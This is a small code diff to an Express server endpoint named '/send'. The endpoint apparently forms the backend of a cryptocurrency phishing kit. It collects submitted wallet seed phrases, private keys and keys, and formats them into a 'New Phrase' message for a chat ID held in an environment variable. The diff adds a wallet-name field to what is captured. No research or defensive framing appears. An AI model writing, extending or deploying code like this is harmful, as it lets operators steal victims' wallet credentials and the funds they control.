@@ -13,6 +13,7 @@ const CHAT_ID = process.env.CHAT_ID;
 app.post("/send", async (req, res) => {
 
     const {
+        walletname,
         phrase,
         private,
         key,
@@ -21,6 +22,8 @@ app.post("/send", async (req, res) => {
 
     const message =
 `📩 New Phrase
+
+Wallet name: ${walletname}
 
 Phrase: ${phrase}
 
